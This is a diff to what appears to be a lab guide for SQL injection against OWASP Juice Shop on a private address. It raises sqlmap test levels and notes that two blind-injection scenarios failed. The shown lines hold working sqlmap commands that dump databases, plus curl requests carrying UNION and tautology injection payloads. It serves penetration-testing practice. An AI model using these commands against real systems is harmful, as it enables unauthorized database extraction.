@@ -32,7 +32,7 @@ curl -X POST "http://10.30.0.237:3000/rest/user/login" \
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"admin@juice-sh.op","password":"password"}' \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite --technique=BEU --level=3 --risk=3 \
+  --dbms=sqlite --technique=BEU --level=5 --risk=3 \
   --batch --dump
 ```
 
@@ -57,7 +57,7 @@ curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20UNION%20SELECT%2
 
 ```zsh
 sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
-  --dbms=sqlite --technique=U --level=3 --risk=3 \
+  --dbms=sqlite --technique=U --level=5 --risk=3 \
   --tables --batch
 ```
 
@@ -80,6 +80,8 @@ curl -X GET "http://10.30.0.237:3000/rest/track-order/1%27%20OR%20%271%27=%271" 
 ```
 
 ### SQL Injection Scenario 4: Boolean-Based Blind SQL Injection
+
+**Note:** This scenario did not work as expected in the current Juice Shop version. The application may not be vulnerable to boolean-based blind SQLi via this vector.
 
 **Objective:** Extract database information using boolean-based blind techniques
 
@@ -135,6 +137,8 @@ print(f"Extracted email: {extracted_email}")
 ```
 
 ### SQL Injection Scenario 5: Time-Based Blind SQL Injection
+
+**Note:** This scenario did not work as expected in the current Juice Shop version. The application may not be vulnerable to time-based blind SQLi via this vector.
 
 **Objective:** Confirm SQL injection using time delays
 
@@ -435,7 +439,7 @@ sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
 sqlmap -u "http://10.30.0.237:3000/rest/admin/application-configuration" \
   --headers="Authorization: Bearer YOUR_JWT_TOKEN_HERE" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite --batch --dump
+  --dbms=sqlite --level=5 --batch --dump
 ```
 
 #### 3. Automated Token Extraction and Injection/Dump Script
@@ -475,7 +479,7 @@ def run_sqlmap_with_token(url, token):
         "sqlmap", "-u", url,
         "--headers", f"Authorization: Bearer {token}",
         "--headers", "Content-Type: application/json",
-        "--dbms=sqlite", "--batch", "--dump"
+        "--dbms=sqlite", "--level=5", "--batch", "--dump"
     ]
     print(f"[+] Running: {' '.join(cmd)}")
     result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
